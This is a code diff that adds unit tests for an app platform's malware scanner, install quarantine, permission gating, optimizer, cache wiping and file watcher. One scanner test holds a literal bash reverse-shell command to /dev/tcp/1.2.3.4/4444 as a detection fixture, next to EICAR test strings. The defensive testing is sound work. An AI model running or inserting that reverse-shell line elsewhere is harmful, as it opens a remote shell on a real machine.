@@ -32,6 +32,13 @@ from kos.registry import Instance, Registry  # noqa: E402
 from kos.broker import spawn  # noqa: E402
 from kos.cmdsurface import CmdSurface  # noqa: E402
 from kos.protocol import validate_app_message as _vam  # noqa: E402
+from kos.scan import EICAR, scan_bytes  # noqa: E402
+from kos.permit import PermitError, PermitStore  # noqa: E402
+from kos.optimize import optimize  # noqa: E402
+from kos import cache as kcache  # noqa: E402
+from kos.store import VirusFoundError  # noqa: E402
+from kos.watch import Watcher  # noqa: E402
+from kos import cli as kcli  # noqa: E402
 
 PW = "correct horse battery"
 EXAMPLE = Path(__file__).resolve().parent.parent / "examples" / "hello"
@@ -401,6 +408,143 @@ class TestActivity(Env):
                 return
             time.sleep(0.05)
         raise AssertionError("instance never reached 'running'")
+
+
+class TestScan(unittest.TestCase):
+    def test_eicar_flagged_clean_file_passes(self):
+        self.assertFalse(scan_bytes(EICAR, "eicar").clean)
+        self.assertTrue(scan_bytes(b"print('hello')", "hello.py").clean)
+
+    def test_recurses_into_zip_without_extracting(self):
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("manifest.json", "{}")
+            z.writestr("payload.bin", EICAR)
+        result = scan_bytes(buf.getvalue(), "evil.kapp")
+        self.assertFalse(result.clean)
+        self.assertTrue(any("payload.bin" in f.path for f in result.findings))
+
+    def test_reverse_shell_pattern_detected(self):
+        r = scan_bytes(b"os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')", "x.py")
+        self.assertFalse(r.clean)
+        self.assertEqual(r.findings[0].rule, "reverse-shell")
+
+
+class TestInstallScanning(Env):
+    def test_flagged_app_is_quarantined_not_installed(self):
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("manifest.json", json.dumps(
+                {"name": "evil", "version": "1", "runtime": "python", "entry": "a"}))
+            z.writestr("a.py", "def main():\n    pass\n# " + EICAR.decode())
+        bad = Path(self.tmp.name) / "evil.kapp"
+        bad.write_bytes(buf.getvalue())
+        store = AppStore(self.paths)
+        with self.assertRaises(VirusFoundError):
+            store.install(bad, self.authority(PW))
+        self.assertNotIn("evil", [a.name for a in store.installed()])
+        quarantined = list((self.paths.state / "quarantine").glob("*.kapp"))
+        self.assertEqual(len(quarantined), 1)
+        # no password was ever spent on it: nothing was asked
+        self.assertEqual(self.prompter.asked, [])
+
+    def test_clean_app_still_installs(self):
+        store = AppStore(self.paths)
+        store.install(self.kapp, self.authority(PW))
+        self.assertIn("hello", [a.name for a in store.installed()])
+
+
+class TestPermit(Env):
+    def test_grant_revoke_require(self):
+        p = PermitStore(self.paths)
+        with self.assertRaises(PermitError):
+            p.require("hello")
+        p.grant("hello")
+        p.require("hello")  # no raise
+        self.assertEqual([x.name for x in p.list()], ["hello"])
+        p.revoke("hello")
+        with self.assertRaises(PermitError):
+            p.require("hello")
+
+    def test_permit_gate_blocks_run_before_any_password_prompt(self):
+        """PermitStore.require() runs before _authority() in cmd_run/cmd_open,
+        so an unpermitted app is refused without ever touching a TTY."""
+        import os as _os
+        old_root = _os.environ.get("KOS_ROOT")
+        _os.environ["KOS_ROOT"] = str(self.paths.root)
+        try:
+            code = kcli.main(["run", "hello"])
+        finally:
+            if old_root is None:
+                _os.environ.pop("KOS_ROOT", None)
+            else:
+                _os.environ["KOS_ROOT"] = old_root
+        self.assertEqual(code, 2)
+
+
+class TestOptimize(Env):
+    def test_recompress_shrinks_and_reseals(self):
+        store = AppStore(self.paths)
+        store.install(self.kapp, self.authority(PW))
+        kapp_path = self.paths.apps / "hello.kapp"
+        # re-store it uncompressed so there is guaranteed slack to reclaim
+        import zipfile as _zf
+        data = kapp_path.read_bytes()
+        buf = io.BytesIO()
+        with _zf.ZipFile(io.BytesIO(data)) as src, _zf.ZipFile(buf, "w", _zf.ZIP_STORED) as dst:
+            for info in src.infolist():
+                dst.writestr(info.filename, src.read(info.filename))
+        kapp_path.write_bytes(buf.getvalue())
+
+        report = optimize(self.paths, self.authority(PW))
+        self.assertGreaterEqual(report.apps_recompressed, 1)
+        self.assertGreater(report.bytes_reclaimed, 0)
+
+        # still verifies after being recompressed and re-sealed
+        with self.authority(PW).authorize("app.run", "hello") as g:
+            app = store.load_verified("hello", g)
+        self.assertEqual(app.manifest.name, "hello")
+
+    def test_prunes_dead_registry_entries(self):
+        from kos.registry import Instance, Registry
+        registry = Registry(self.paths)
+        registry.write(Instance(id="dead-1", name="hello", mode="cmd", broker_pid=999999999,
+                                sock_path="/nonexistent", log_path="/nonexistent", started=0))
+        report = optimize(self.paths, self.authority(PW))
+        self.assertEqual(report.dead_instances_pruned, 1)
+        self.assertEqual(registry.list(), [])
+
+
+class TestCache(unittest.TestCase):
+    def test_wipe_removes_contents_and_directory(self):
+        with tempfile.TemporaryDirectory() as base:
+            paths = Paths(Path(base))
+            d = kcache.alloc(paths, "hello")
+            (d / "secret.txt").write_text("do not persist me")
+            (d / "sub").mkdir()
+            (d / "sub" / "more.txt").write_text("nor me")
+            self.assertTrue(d.exists())
+            kcache.wipe(d)
+            self.assertFalse(d.exists())
+
+    def test_wipe_of_missing_dir_is_a_noop(self):
+        kcache.wipe(Path("/nonexistent/definitely/not/here"))  # must not raise
+
+
+class TestWatcher(unittest.TestCase):
+    def test_detects_a_write_and_the_scanner_flags_it(self):
+        from kos.scan import scan_file
+        with tempfile.TemporaryDirectory() as d:
+            w = Watcher([d])
+            (Path(d) / "payload.bin").write_bytes(EICAR)
+            import time
+            time.sleep(0.2)
+            events = w.read_events()
+            w.close()
+            self.assertTrue(any(e.endswith("payload.bin") for e in events))
+            result = scan_file(Path(events[0]))
+            self.assertFalse(result.clean)
+            self.assertEqual(result.findings[0].rule, "eicar-test-file")
 
 
 if __name__ == "__main__":
